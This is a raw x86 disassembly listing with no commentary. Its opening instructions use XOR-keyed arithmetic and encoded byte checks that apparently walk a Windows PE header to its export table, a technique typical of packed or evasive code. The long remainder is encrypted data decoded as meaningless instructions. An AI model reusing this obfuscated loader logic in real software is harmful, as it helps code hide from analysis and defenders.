  419286:	mov    eax,DWORD PTR [ebp+0xc]
  419289:	mov    edi,DWORD PTR [ebp+0xc]
  41928c:	xor    edi,ecx
  41928e:	xor    eax,ecx
  419290:	lea    eax,[eax+edi*1+0x64e5b6]
  419297:	mov    edi,DWORD PTR [ebp+0xc]
  41929a:	xor    edi,ecx
  41929c:	add    edi,edx
  41929e:	imul   eax,edi
  4192a1:	mov    edi,DWORD PTR [ebp+0xc]
  4192a4:	xor    edi,ecx
  4192a6:	sub    edi,eax
  4192a8:	mov    eax,DWORD PTR [ebp-0x4]
  4192ab:	add    edi,edx
  4192ad:	cmp    DWORD PTR [eax],edi
  4192af:	mov    eax,DWORD PTR [ebp-0x4]
  4192b2:	mov    edi,DWORD PTR [ebp+0x10]
  4192b5:	jg     0x4192c8
  4192bb:	xor    edi,ecx
  4192bd:	mov    ebx,esi
  4192bf:	sub    ebx,edi
  4192c1:	add    DWORD PTR [eax],ebx
  4192c3:	jmp    0x4192ce
  4192c8:	xor    edi,ecx
  4192ca:	add    edi,edx
  4192cc:	add    DWORD PTR [eax],edi
  4192ce:	mov    eax,DWORD PTR [ebp-0x8]
  4192d1:	mov    edi,DWORD PTR [ebp-0x10]
  4192d4:	mov    eax,DWORD PTR [eax]
  4192d6:	xor    edi,ecx
  4192d8:	add    edi,0x3272da
  4192de:	not    edi
  4192e0:	and    eax,edi
  4192e2:	movsx  di,BYTE PTR [eax+0x1]
  4192e7:	mov    ebx,0x3b4b
  4192ec:	sub    di,bx
  4192ef:	mov    ebx,0x8a85
  4192f4:	xor    di,bx
  4192f7:	mov    ebx,0x4f8a
  4192fc:	cmp    di,bx
  4192ff:	jne    0x419327
  419305:	movsx  di,BYTE PTR [eax]
  419309:	mov    ebx,0x3b4b
  41930e:	sub    di,bx
  419311:	mov    ebx,0x8a85
  419316:	xor    di,bx
  419319:	mov    ebx,0x4f87
  41931e:	cmp    di,bx
  419321:	je     0x419337
  419327:	mov    edi,DWORD PTR [ebp-0x10]
  41932a:	xor    edi,ecx
  41932c:	mov    ebx,esi
  41932e:	sub    ebx,edi
  419330:	add    eax,ebx
  419332:	jmp    0x4192e2
  419337:	mov    esi,DWORD PTR [ebp-0x14]
  41933a:	mov    esi,DWORD PTR [esi]
  41933c:	mov    edi,DWORD PTR [eax+0x3c]
  41933f:	lea    esi,[edi+esi*8+0x78]
  419343:	mov    esi,DWORD PTR [esi+eax*1]
  419346:	mov    DWORD PTR [ebp-0x8],esi
  419349:	mov    esi,DWORD PTR [ebp+0x8]
  41934c:	xor    esi,ecx
  41934e:	add    esi,edx
  419350:	mov    DWORD PTR [ebp-0x14],esi
  419353:	mov    esi,DWORD PTR [ebp+0x8]
  419356:	mov    edi,DWORD PTR [ebp-0x8]
  419359:	xor    esi,ecx
  41935b:	add    esi,edx
  41935d:	pop    ebx
  41935e:	cmp    edi,esi
  419360:	jne    0x41937e
  419366:	mov    eax,DWORD PTR [ebp+0xc]
  419369:	xor    eax,ecx
  41936b:	mov    ecx,DWORD PTR [ebp-0x8]
  41936e:	add    eax,edx
  419370:	imul   eax,ecx
  419373:	mov    DWORD PTR [ebp-0x8],eax
  419376:	push   DWORD PTR [ebp+0x18]
  419379:	jmp    0x41b78a
  41937e:	mov    ecx,DWORD PTR [ebp-0x8]
  419381:	add    ecx,eax
  419383:	jmp    0x41b73b
  419388:	dec    ebx
  419389:	cmp    al,0x60
  41938b:	or     DWORD PTR [edi],0x426c6b9d
  419391:	push   cs
  419392:	mov    ch,BYTE PTR [edi+eax*4-0x37]
  419396:	adc    BYTE PTR [ebx-0x21],bh
  419399:	add    DWORD PTR [ecx+0x62],esp
  41939c:	(bad)  
  41939d:	pop    edi
  41939e:	bound  esp,QWORD PTR [edx+0x17]
  4193a1:	mov    al,ds:0x73b3d801
  4193a6:	pop    ecx
  4193a7:	(bad)  
  4193a8:	test   eax,0x9eafb5d7
  4193ad:	xchg   ebx,eax
  4193ae:	fmul   QWORD PTR ds:0x2ee5e104
  4193b4:	in     al,dx
  4193b5:	mov    dh,0x92
  4193b7:	jo     0x419395
  4193b9:	ret    
  4193ba:	in     eax,0x50
  4193bc:	out    0xd,al
  4193be:	push   esp
  4193bf:	fwait
  4193c0:	jp     0x419350
  4193c2:	and    al,0x37
  4193c4:	inc    ebx
  4193c5:	scas   al,BYTE PTR es:[edi]
  4193c6:	je     0x41942b
  4193c8:	outs   dx,DWORD PTR ds:[esi]
  4193c9:	arpl   WORD PTR [edx+0x2bc388cf],si
  4193cf:	push   0x29
  4193d1:	sahf   
  4193d2:	sbb    al,0x54
  4193d4:	jl     0x419384
  4193d6:	repz or eax,0xa17b670e
  4193dc:	fcomp  QWORD PTR [ebx]
  4193de:	inc    eax
  4193df:	jbe    0x419403
  4193e1:	mov    esi,DWORD PTR [edi+0x6a9f1d97]
  4193e7:	inc    edx
  4193e8:	rcl    DWORD PTR [ecx+0x46],0xf4
  4193ec:	ret    0x8dc
  4193ef:	add    DWORD PTR [ebp+0x7772a9e0],edi
  4193f5:	js     0x419469
  4193f7:	xor    ebx,DWORD PTR [esi+0x4aa26df9]
  4193fd:	int3   
  4193fe:	(bad)  
  4193ff:	aam    0x8c
  419401:	add    eax,0x13824a8
  419406:	std    
  419407:	sbb    eax,DWORD PTR [ebx]
  419409:	loopne 0x4193f6
  41940b:	add    bl,BYTE PTR [edi]
  41940d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41940f:	clc    
  419410:	push   cs
  419411:	lahf   
  419412:	loopne 0x4193f9
  419414:	jge    0x4193a3
  419416:	ror    bh,cl
  419418:	sub    DWORD PTR [ebx-0x2d],edi
  41941b:	sub    ebp,DWORD PTR [ebp+0x20]
  41941e:	mov    bl,0x66
  419420:	adc    BYTE PTR [esi-0x29],dh
  419423:	dec    edi
  419424:	pop    ecx
  419425:	fsubr  st(7),st
  419427:	gs pop edx
  419429:	lock pop ecx
  41942b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41942c:	mov    ebx,DWORD PTR [ebx-0x584fc1bc]
  419432:	aas    
  419433:	icebp  
  419434:	fdiv   QWORD PTR [eax]
  419436:	mov    WORD PTR [esi+0x5],gs
  419439:	inc    esi
  41943a:	call   0xa9f7:0xc5529072
  419441:	or     ebp,DWORD PTR [ebx+esi*8+0x442fa72b]
  419448:	pop    es
  419449:	out    dx,eax
  41944a:	xchg   esi,eax
  41944b:	mov    esp,0xf56e3130
  419450:	iret   
  419451:	or     eax,0xdeca0387
  419456:	(bad)  
  419457:	cli    
  419458:	ss daa 
  41945a:	fdivr  st(7),st
  41945c:	popa   
  41945d:	(bad)  
  41945e:	call   0xd2299db4
  419463:	in     eax,dx
  419464:	nop
  419465:	mov    ds:0x1f816122,eax
  41946a:	sub    al,0x24
  41946c:	mov    ah,0xf1
  41946e:	aaa    
  41946f:	fcmovu st,st(4)
  419471:	inc    edx
  419472:	or     al,0x62
  419474:	xchg   esp,eax
  419475:	add    esp,DWORD PTR [ebx+eiz*4]
  419478:	cmp    al,BYTE PTR [edi+0x306c584]
  41947e:	dec    esi
  41947f:	or     eax,0xfcd59650
  419484:	adc    al,0x7d
  419486:	and    ch,ch
  419488:	jne    0x41949e
  41948a:	add    DWORD PTR [eax+ebp*1-0x565595b9],0xf1a1e062
  419495:	or     BYTE PTR [ebx],cl
  419497:	jp     0x419454
  419499:	xor    eax,0xb28ed04d
  41949e:	fstp   QWORD PTR [eax]
  4194a0:	xchg   esp,eax
  4194a1:	pop    esi
  4194a2:	call   0xada2:0x18e912d8
  4194a9:	repnz sub al,0x10
  4194ac:	out    0x63,eax
  4194ae:	pusha  
  4194af:	jle    0x4194c0
  4194b1:	fdiv   st(0),st
  4194b3:	test   al,0x40
  4194b5:	xor    cl,BYTE PTR [eax-0x31]
  4194b8:	aam    0x9f
  4194ba:	pop    esp
  4194bb:	data16 (bad) 
  4194bd:	ror    BYTE PTR [edx-0x87eeb7c],cl
  4194c3:	cmp    eax,DWORD PTR [ebx+0x2c]
  4194c6:	call   FWORD PTR [edi]
  4194c8:	mov    esi,0x39e462f4
  4194cd:	sahf   
  4194ce:	icebp  
  4194cf:	jmp    0xe647cde9
  4194d4:	xor    eax,0x43379377
  4194d9:	push   edx
  4194da:	ja     0x419529
  4194dc:	inc    esi
  4194dd:	pop    esp
  4194de:	or     eax,0xc78a1c1c
  4194e3:	push   ecx
  4194e4:	outs   dx,DWORD PTR ds:[esi]
  4194e5:	dec    edx
  4194e6:	(bad)  
  4194e7:	jmp    0x41947b
  4194e9:	cs cmp eax,0xe5b07642
  4194ef:	xor    BYTE PTR [esi-0x63],dl
  4194f2:	sub    edx,DWORD PTR [ecx+0x1b9ed0b7]
  4194f8:	mov    ebp,0x446c56c0
  4194fd:	ret    0xd12e
  419500:	icebp  
  419501:	stos   DWORD PTR es:[edi],eax
  419502:	stc    
  419503:	or     BYTE PTR [ebx],al
  419505:	mov    ch,0xa4
  419507:	xor    eax,0x14a9f1ea
  41950c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41950d:	cwde   
  41950e:	mov    dh,0x7
  419510:	aaa    
  419511:	aam    0xa1
  419513:	cmp    al,0xe2
  419515:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419516:	js     0x419529
  419518:	inc    ecx
  419519:	(bad)  
  41951a:	mov    ch,0x97
  41951c:	sar    ah,1
  41951e:	ds push eax
  419520:	jno    0x419563
  419522:	repnz mov al,ds:0x8b4a5bd6
  419528:	cmp    ah,BYTE PTR [edi-0x388c3dfa]
  41952e:	cld    
  41952f:	mov    edx,0x519d2919
  419534:	xchg   edx,eax
  419535:	or     al,0x5d
  419537:	pop    ds
  419538:	add    cl,bh
  41953a:	cmp    esi,DWORD PTR [ebx+0x6a]
  41953d:	jae    0x419579
  41953f:	mov    al,0x44
  419541:	or     dl,cl
  419543:	repz mov ds:0x42eba6a5,al
  419549:	pop    ds
  41954a:	push   ss
  41954b:	scas   eax,DWORD PTR es:[di]
  41954d:	retf   
  41954e:	mov    ch,0xab
  419550:	dec    edx
  419551:	test   al,0xaf
  419553:	scas   al,BYTE PTR es:[edi]
  419554:	mov    DWORD PTR [edi-0x34],ecx
  419557:	add    al,0xe5
  419559:	fwait
  41955a:	jp     0x419587
  41955c:	repnz dec ebp
  41955e:	mov    bh,0x37
  419560:	jecxz  0x419500
  419562:	cmp    al,0x8
  419564:	xor    al,0xde
  419566:	add    eax,0x547e3ec5
  41956b:	leave  
  41956c:	jb     0x41959f
  41956e:	fwait
  41956f:	jb     0x4195e5
  419571:	and    eax,0x9b8db9f0
  419576:	cmp    eax,0xa51bd9ca
  41957b:	cmp    cl,BYTE PTR [ebp+0x32]
  41957e:	xchg   esi,eax
  41957f:	lock xchg al,bh
  419582:	test   eax,0xe3479bdb
  419587:	cwde   
  419588:	clc    
  419589:	ins    BYTE PTR es:[edi],dx
  41958a:	test   eax,0x2352866
  41958f:	aaa    
  419590:	or     BYTE PTR [edi-0x7f],dl
  419593:	out    dx,eax
  419594:	cmp    al,0x58
  419596:	cdq    
  419597:	sbb    DWORD PTR [edi-0x2af8af3a],ebx
  41959d:	ds or  al,0x8a
  4195a0:	idiv   esp
  4195a2:	and    BYTE PTR gs:[ebx+0x15bda4a4],0x6c
  4195aa:	sub    BYTE PTR ds:0x4ee32d1c,0x45
  4195b1:	mov    dh,BYTE PTR [ebx]
  4195b3:	sti    
  4195b4:	push   esp
  4195b5:	(bad)  
  4195b6:	pushf  
  4195b7:	js     0x4195f8
  4195b9:	stos   BYTE PTR es:[edi],al
  4195ba:	lds    edx,FWORD PTR [ecx]
  4195bc:	and    bl,BYTE PTR [ecx]
  4195be:	xchg   esp,eax
  4195bf:	xchg   ebp,esi
  4195c1:	idiv   eax
  4195c3:	mov    ah,0x2b
  4195c5:	cmp    BYTE PTR [ebp+0x67],bl
  4195c8:	jmp    0x4195e4
  4195ca:	or     DWORD PTR [esi-0x14],edi
  4195cd:	push   eax
  4195ce:	lahf   
  4195cf:	lods   al,BYTE PTR ds:[esi]
  4195d0:	popf   
  4195d1:	dec    edi
  4195d2:	dec    esi
  4195d3:	pop    esi
  4195d4:	out    0x74,al
  4195d6:	mov    bl,BYTE PTR [edx]
  4195d8:	nop
  4195d9:	xchg   ebp,eax
  4195da:	dec    ecx
  4195db:	icebp  
  4195dc:	mov    ebp,0x43fea12f
  4195e1:	(bad)  
  4195e2:	push   ebp
  4195e3:	pop    edx
  4195e4:	sar    cl,0x3b
  4195e7:	nop
  4195e8:	mov    ecx,0xb33c1ce3
  4195ed:	jecxz  0x4195c5
  4195ef:	dec    eax
  4195f0:	leave  
  4195f1:	mov    al,0x95
  4195f3:	enter  0xc542,0x1f
  4195f7:	lahf   
  4195f8:	xor    esi,DWORD PTR ds:0x73d9a419
  4195fe:	sub    DWORD PTR [ebx+0x15f9aa6e],ebp
  419604:	fcom   DWORD PTR [eax-0xf6f1556]
  41960a:	fcmovu st,st(1)
  41960c:	jno    0x419643
  41960e:	mov    ebp,0x52b4b3d6
  419613:	pop    esp
  419614:	pusha  
  419615:	dec    ebp
  419616:	and    dh,BYTE PTR [eax-0x23]
  419619:	xchg   esp,eax
  41961a:	add    al,BYTE PTR [eax]
  41961c:	test   eax,0x88a6310e
  419621:	add    DWORD PTR [esi-0x1421c6be],ebp
  419627:	js     0x4195d6
  419629:	or     eax,0x3d9d8a6f
  41962e:	dec    edx
  41962f:	cwde   
  419630:	cli    
  419631:	adc    DWORD PTR [edx-0x6],ebx
  419634:	sti    
  419635:	(bad)  
  419636:	in     eax,dx
  419637:	nop
  419638:	or     edi,DWORD PTR ds:[esp+esi*1+0x5a]
  41963d:	ret    0xa019
  419640:	inc    esi
  419641:	push   esi
  419642:	fsub   QWORD PTR [edi+0x522c660f]
  419648:	pop    ss
  419649:	mov    gs,WORD PTR [ebx]
  41964b:	(bad)  
  41964c:	call   0x82c4:0xde4488ef
  419653:	adc    eax,0xfb24afdb
  419658:	mov    esi,0xdc459d6b
  41965d:	inc    esi
  41965e:	jg     0x4195eb
  419660:	and    eax,0x910f49cc
  419665:	and    al,0xf6
  419667:	push   esp
  419668:	pop    es
  419669:	leave  
  41966a:	dec    esi
  41966b:	pop    ebx
  41966c:	and    al,0x51
  41966e:	xchg   edx,eax
  41966f:	gs mov ch,0x3d
  419672:	cmp    DWORD PTR [ebp-0x5a],0x22
  419676:	fmulp  st(6),st
  419678:	xchg   ecx,eax
  419679:	in     al,0x46
  41967b:	aaa    
  41967c:	out    dx,al
  41967d:	or     DWORD PTR [edi+0x2e65d78c],esi
  419683:	pusha  
  419684:	aas    
  419685:	ret    0xf631
  419688:	iret   
  419689:	mov    dh,0x73
  41968b:	cmp    ch,ah
  41968d:	call   FWORD PTR [edx-0x7f]
  419690:	sub    edi,edi
  419692:	mov    dl,0x7
  419694:	in     al,0xf4
  419696:	sub    ebx,DWORD PTR [eax+0x27]
  419699:	cmp    DWORD PTR [eax+ebp*2],esi
  41969c:	mov    eax,ds:0x1f8d6a10
  4196a1:	dec    esi
  4196a2:	lds    esi,FWORD PTR [ebp+0xb]
  4196a5:	or     DWORD PTR [edx+0x45],ecx
  4196a8:	icebp  
  4196a9:	repz loope 0x419706
  4196ac:	mov    ebx,fs
  4196ae:	int3   
  4196af:	push   ebp
  4196b0:	cdq    
  4196b1:	adc    eax,0xef76dc92
  4196b6:	dec    esp
  4196b7:	les    ebp,FWORD PTR [esi-0xc12cbbc]
  4196bd:	inc    edx
  4196be:	jg     0x419707
  4196c0:	push   edx
  4196c1:	shl    BYTE PTR [ebx],1
  4196c3:	push   edi
  4196c4:	cli    
  4196c5:	in     eax,0xd4
  4196c7:	mov    edx,0x37549ffc
  4196cc:	sahf   
  4196cd:	or     DWORD PTR [ecx+edx*8-0x75],0xffffffa8
  4196d2:	icebp  
  4196d3:	pop    edi
  4196d4:	fistp  WORD PTR [esi-0x6ea78595]
  4196da:	jno    0x419734
  4196dc:	jne    0x419672
  4196de:	jns    0x4196f7
  4196e0:	cs pop ss
  4196e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196e3:	jns    0x419720
  4196e5:	xchg   ecx,eax
  4196e6:	das    
  4196e7:	mov    edx,0xa1625a06
  4196ec:	and    DWORD PTR [edi],eax
  4196ee:	loop   0x419700
  4196f0:	xor    eax,0x470e93b8
  4196f5:	test   BYTE PTR [ebx-0x5],0x62
  4196f9:	iret   
  4196fa:	push   ebp
  4196fb:	adc    eax,0xa29870a0
  419700:	cdq    
  419701:	sbb    BYTE PTR [eax-0x39],ah
  419704:	(bad)  
  419705:	adc    DWORD PTR [eax-0x14771e76],ecx
  41970b:	lds    ebx,FWORD PTR [edx+edx*1+0x7cce5c8b]
  419712:	or     bh,BYTE PTR [edi+ebp*1+0x3d]
  419716:	add    edx,eax
  419718:	mov    dh,0xe7
  41971a:	dec    ecx
  41971b:	mov    ebp,0x6f2ceddf
  419720:	jb     0x41971f
  419722:	and    DWORD PTR [ebp-0x18],esp
  419725:	cmp    bh,ch
  419727:	mov    eax,ds:0x734dbb20
  41972c:	sub    dh,BYTE PTR ds:0x353a9c9b
  419732:	cmp    BYTE PTR [ebp+0x596373e8],bh
  419738:	shr    DWORD PTR [ecx-0x5b],0x9f
  41973c:	mov    esi,0x602d4e93
  419741:	or     BYTE PTR [ebx-0x30],cl
  419744:	int3   
  419745:	jge    0x41975d
  419747:	les    ebx,FWORD PTR [ecx-0x25ba9e76]
  41974d:	stos   BYTE PTR es:[edi],al
  41974e:	jle    0x41973f
  419750:	outs   dx,BYTE PTR ds:[esi]
  419751:	jo     0x4197b7
  419753:	and    edx,edx
  419755:	and    dh,BYTE PTR [esi]
  419757:	or     al,0xf8
  419759:	push   ds
  41975a:	sbb    DWORD PTR [eax+eiz*4],ebx
  41975d:	inc    esp
  41975e:	and    eax,0xe2339aac
  419763:	jg     0x419724
  419765:	bound  esi,QWORD PTR [esi-0x15c1ee88]
  41976b:	mov    dh,0x6f
  41976d:	jg     0x419770
  41976f:	fxch   st(0)
  419771:	cld    
  419772:	push   ecx
  419773:	add    al,0x0
  419775:	lods   eax,DWORD PTR ds:[esi]
  419776:	fldcw  WORD PTR ds:0xdf17bac2
  41977c:	inc    edi
  41977d:	pop    ebx
  41977e:	mov    ebp,0x17b28416
  419783:	sub    DWORD PTR [ebp-0x33],edi
  419786:	and    eax,DWORD PTR [eax]
  419788:	jae    0x4197de
  41978a:	push   edi
  41978b:	sub    al,0xb4
  41978d:	int3   
  41978e:	inc    esp
  41978f:	retw   
  419791:	test   eax,0x71f8f42b
  419796:	or     DWORD PTR [edi-0xc],ebp
  419799:	es aas 
  41979b:	clc    
  41979c:	mov    ebx,0xd5ca4533
  4197a1:	mov    ebx,0x66f7c3d5
  4197a6:	mov    edx,DWORD PTR ds:0xa141e96a
  4197ac:	lock cld 
  4197ae:	mov    eax,0xcc92750a
  4197b3:	adc    BYTE PTR [eax+0x63],bh
  4197b6:	mov    esp,0x55dcc111
  4197bb:	pop    esp
  4197bc:	adc    ch,BYTE PTR [edi-0x1f138b4b]
  4197c2:	mul    BYTE PTR [edi]
  4197c4:	repnz test al,0x7e
  4197c7:	not    BYTE PTR [eax-0x10]
  4197ca:	push   ebp
  4197cb:	jb     0x419769
  4197cd:	aas    
  4197ce:	jge    0x41984a
  4197d0:	xor    BYTE PTR [ebp-0x45],bl
  4197d3:	add    eax,0xf343d35c
  4197d8:	cmp    eax,0x93079ce
  4197dd:	cmp    al,0xf5
  4197df:	push   ss
  4197e0:	adc    esi,DWORD PTR [ebp+0x5b]
  4197e3:	test   DWORD PTR [edi-0x1e],edx
  4197e6:	aad    0x34
  4197e8:	pusha  
  4197e9:	add    BYTE PTR [edx-0x14],ch
  4197ec:	cmp    DWORD PTR [eax-0x44],edi
  4197ef:	xor    dl,dl
  4197f1:	aad    0x7e
  4197f3:	retf   
  4197f4:	lods   al,BYTE PTR ds:[esi]
  4197f5:	mov    esp,0xf4a784dd
  4197fa:	jo     0x41979e
  4197fc:	mov    esp,0xf6fb496b
  419801:	jno    0x7f7b89cf
  419807:	scas   al,BYTE PTR es:[edi]
  419808:	stos   DWORD PTR es:[edi],eax
  419809:	loopne 0x419845
  41980b:	xor    al,0x20
  41980d:	mov    dh,BYTE PTR [eax+ebp*1]
  419810:	popa   
  419811:	xchg   edx,eax
  419812:	sbb    ecx,DWORD PTR [esp+ebp*2]
  419815:	pop    ecx
  419816:	enter  0xea25,0x48
  41981a:	jmp    0x464030fb
  41981f:	jno    0x41986b
  419821:	cli    
  419822:	mov    DWORD PTR [ebx],ebp
  419824:	ins    DWORD PTR es:[edi],dx
  419825:	aas    
  419826:	xchg   esi,eax
  419827:	mov    WORD PTR [ebx-0x6e],ds
  41982a:	add    edi,DWORD PTR [ebp-0x4f]
  41982d:	std    
  41982e:	shl    cl,0xe
  419831:	stos   DWORD PTR es:[edi],eax
  419832:	sahf   
  419833:	call   0xcf1d:0xd5b87694
  41983a:	ds adc al,0x25
  41983d:	add    edi,ebx
  41983f:	mov    dl,0x18
  419841:	in     al,dx
  419842:	adc    DWORD PTR [ebx+0x11],ebp
  419845:	mov    esp,0xfc3d7afb
  41984a:	pop    edi
  41984b:	and    bh,BYTE PTR [edi-0x307d78]
  419851:	(bad)  
  419852:	xor    al,0x88
  419854:	dec    edx
  419855:	sub    al,0x92
  419857:	jge    0x419858
  419859:	int3   
  41985a:	ret    0x7c52
  41985d:	std    
  41985e:	xor    bh,BYTE PTR [edi-0x66eef454]
  419864:	loop   0x4198c0
  419866:	pusha  
  419867:	aaa    
  419868:	stc    
  419869:	cdq    
  41986a:	leave  
  41986b:	add    DWORD PTR [esi],ebx
  41986d:	pop    esp
  41986e:	ret    
  41986f:	into   
  419870:	mov    DWORD PTR cs:[ebp+0x72],0xd01e1c23
  419878:	cmp    al,0xf1
  41987a:	inc    ebp
  41987b:	fbld   TBYTE PTR [esi-0xa]
  41987e:	(bad)  
  41987f:	addr16 inc edi
  419881:	cmc    
  419882:	sbb    edi,DWORD PTR [ebp+0x4b330ff8]
  419888:	call   0xb3666995
  41988d:	cmp    BYTE PTR [esi],al
  41988f:	add    al,0xb7
  419891:	sub    ecx,DWORD PTR [esp+ebx*8+0x692f92ab]
  419898:	jg     0x4198ca
  41989a:	sti    
  41989b:	lea    esi,[eax]
  41989d:	arpl   WORD PTR [eax+esi*1+0x27],cx
  4198a1:	inc    edi
  4198a2:	jge    0x41982e
  4198a4:	inc    ebp
  4198a5:	adc    ecx,DWORD PTR [edx-0x1b]
  4198a8:	xchg   edi,eax
  4198a9:	not    DWORD PTR [ecx-0x37]
  4198ac:	push   ds
  4198ad:	bound  edi,QWORD PTR [ebx+0x75]
  4198b0:	aaa    
  4198b1:	js     0x419857
  4198b3:	or     dl,cl
  4198b5:	test   ah,bh
  4198b7:	xchg   BYTE PTR cs:[edi],dl
  4198ba:	(bad)  
  4198bc:	dec    ecx
  4198bd:	jg     0x41991c
  4198bf:	jbe    0x419926
  4198c1:	xor    esp,DWORD PTR ds:0x4aa99352
  4198c7:	pop    ebx
  4198c8:	dec    eax
  4198c9:	xchg   esp,eax
  4198ca:	int    0xbc
  4198cc:	into   
  4198cd:	dec    ebp
  4198ce:	(bad)  
  4198cf:	jo     0x4198c1
  4198d1:	inc    edi
  4198d2:	repz or esi,0xffffffac
  4198d6:	das    
  4198d7:	add    al,0xaf
  4198d9:	dec    esi
  4198da:	jmp    0xfda5:0x2aec8fb9
  4198e1:	inc    eax
  4198e2:	xchg   esi,eax
  4198e3:	and    dl,BYTE PTR [esi-0x78]
  4198e6:	addr16 cmp ch,ch
  4198e9:	jnp    0x419946
  4198eb:	imul   esi
  4198ed:	mov    bl,0x4b
  4198ef:	push   es
  4198f0:	(bad)  
  4198f1:	out    0x59,eax
  4198f3:	or     esi,DWORD PTR [ecx]
  4198f5:	out    dx,al
  4198f6:	mov    ecx,DWORD PTR [edx+0x7f]
  4198f9:	jmp    0x2b6:0x77cbf815
  419900:	xor    al,0x80
  419902:	add    al,0xe4
  419904:	jmp    0x74a80d3c
  419909:	ret    0x748a
  41990c:	xlat   BYTE PTR ds:[ebx]
  41990d:	and    ch,BYTE PTR [edi-0x66]
  419910:	aam    0xfc
  419912:	push   edx
  419913:	sti    
  419914:	xor    BYTE PTR [eax+ecx*8-0x4a],0x2
  419919:	push   0x43
  41991b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41991c:	xor    ah,BYTE PTR [eax+0x2a]
  41991f:	lods   eax,DWORD PTR ds:[esi]
  419920:	sbb    al,BYTE PTR [ecx-0x7d]
  419923:	mov    dl,0xae
  419925:	adc    eax,0xf54cac9f
  41992a:	mov    dl,0x5c
  41992c:	dec    ebp
  41992d:	mov    ah,0x11
  41992f:	sub    DWORD PTR [ebx+edx*4+0x3ca13130],ecx
  419936:	ja     0x4198cb
  419938:	xchg   ebp,eax
  419939:	gs mov ah,0xb2
  41993c:	pop    es
  41993d:	cs ins BYTE PTR es:[edi],dx
  41993f:	mov    esp,0xbad83700
  419944:	push   edi
  419945:	ret    0x5c00
  419948:	inc    esi
  419949:	in     al,dx
  41994a:	fcom   QWORD PTR [ecx+edi*8+0x3faf41ab]
  419951:	pop    eax
  419952:	mov    esp,0x99f2ae68
  419957:	mov    ebx,0xcad48dec
  41995c:	in     al,dx
  41995d:	pop    ebx
  41995e:	test   eax,0x8a9969d5
  419963:	cs ins DWORD PTR es:[edi],dx
  419965:	fninit 
  419967:	lods   al,BYTE PTR ds:[esi]
  419968:	test   DWORD PTR [edi+0x6ea5ea2f],eax
  41996e:	cmp    BYTE PTR [ebp-0x60],ah
  419971:	nop
  419972:	dec    esp
  419973:	idiv   DWORD PTR [ecx-0x73]
  419976:	or     DWORD PTR [edi-0x34],esi
  419979:	xchg   BYTE PTR ds:0x5f8612fc,ch
  41997f:	adc    WORD PTR [edx-0x38462742],0xac83
  419988:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419989:	out    0x2b,eax
  41998b:	mov    eax,0x66ba8ea
  419990:	dec    eax
  419991:	int    0xfd
  419993:	fwait
  419994:	cmp    eax,0xdd099b50
  419999:	ds sub eax,0xed761053
  41999f:	cwde   
  4199a0:	xor    ebx,ebx
  4199a2:	fs loop 0x419961
  4199a5:	push   ebx
  4199a6:	int    0x14
  4199a8:	xchg   BYTE PTR [ecx+eiz*4+0x3495c449],ah
  4199af:	push   ecx
  4199b0:	fnstsw WORD PTR [edx+0x79f36db7]
  4199b6:	or     BYTE PTR [eax+0x68a8f7a3],dl
  4199bc:	dec    ebp
  4199bd:	and    al,0x79
  4199bf:	test   BYTE PTR [ecx+0x38],cl
  4199c2:	es loop 0x4199db
  4199c5:	retf   
  4199c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199c8:	(bad)  
  4199c9:	int3   
  4199ca:	test   BYTE PTR [edi-0x5ec48730],ah
  4199d0:	test   BYTE PTR [eax+0x7bcbf319],ah
  4199d6:	test   al,0x9
  4199d8:	jmp    0x41ff3f23
  4199dd:	cmc    
  4199de:	or     eax,0xc028335
  4199e3:	shl    bl,1
  4199e5:	add    dh,BYTE PTR [edi+eiz*8+0x6b300dcf]
  4199ec:	or     dl,ch
  4199ee:	mov    ah,0x3e
  4199f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199f1:	rdmsr  
  4199f3:	daa    
  4199f4:	and    al,0xe8
  4199f6:	sbb    ebp,eax
  4199f8:	test   al,bl
  4199fa:	enter  0xca62,0xfc
  4199fe:	jmp    0x20d9:0x9e2fe7b3
  419a05:	xchg   edi,eax
  419a06:	call   FWORD PTR [ebx+0x1d]
  419a09:	pop    ecx
  419a0a:	push   ss
  419a0b:	adc    DWORD PTR [edx],ecx
  419a0d:	icebp  
  419a0e:	movsx  eax,dx
  419a11:	sbb    al,0xf
  419a13:	mov    cl,0x9f
  419a15:	mov    esp,ss
  419a17:	leave  
  419a18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a19:	dec    edi
  419a1a:	stc    
  419a1b:	push   0xffffffe0
  419a1d:	push   eax
  419a1e:	inc    esi
  419a1f:	stos   BYTE PTR es:[edi],al
  419a20:	jo     0x419a94
  419a22:	fld    DWORD PTR [edi]
  419a24:	xchg   DWORD PTR [edi],esi
  419a26:	ret    
  419a27:	xchg   esi,eax
  419a28:	push   0xfffffff8
  419a2a:	pop    edi
  419a2b:	outs   dx,BYTE PTR ds:[esi]
  419a2c:	mov    dh,0x37
  419a2e:	adc    DWORD PTR [ebx],edi
  419a30:	repz lock out dx,al
  419a33:	xor    edi,DWORD PTR [ebx+0x4faa8bee]
  419a39:	sbb    dh,bl
  419a3b:	jae    0x419aa5
  419a3d:	data16 mov bl,0xdf
  419a40:	cli    
  419a41:	mov    WORD PTR [ecx],?
  419a43:	add    eax,0xa53891d7
  419a48:	int    0x34
  419a4a:	inc    esi
  419a4b:	mov    esp,0xff1a8a03
  419a50:	push   edx
  419a51:	aas    
  419a52:	fcomp  DWORD PTR [edx+0x67]
  419a55:	xor    BYTE PTR [esi],0xa1
  419a58:	pushf  
  419a59:	fist   DWORD PTR [eax+0x21]
  419a5c:	inc    ebp
  419a5d:	xchg   BYTE PTR [esi-0x4470b0e7],bl
  419a63:	test   al,0x2d
  419a65:	stos   BYTE PTR es:[edi],al
  419a66:	fidiv  DWORD PTR [esi-0x246da674]
  419a6c:	iret   
  419a6d:	xor    eax,ebp
  419a6f:	lods   eax,DWORD PTR ds:[esi]
  419a70:	dec    edx
  419a71:	pop    ecx
  419a72:	(bad)  [esi-0x5d]
  419a75:	hlt    
  419a76:	add    esp,DWORD PTR [ecx]
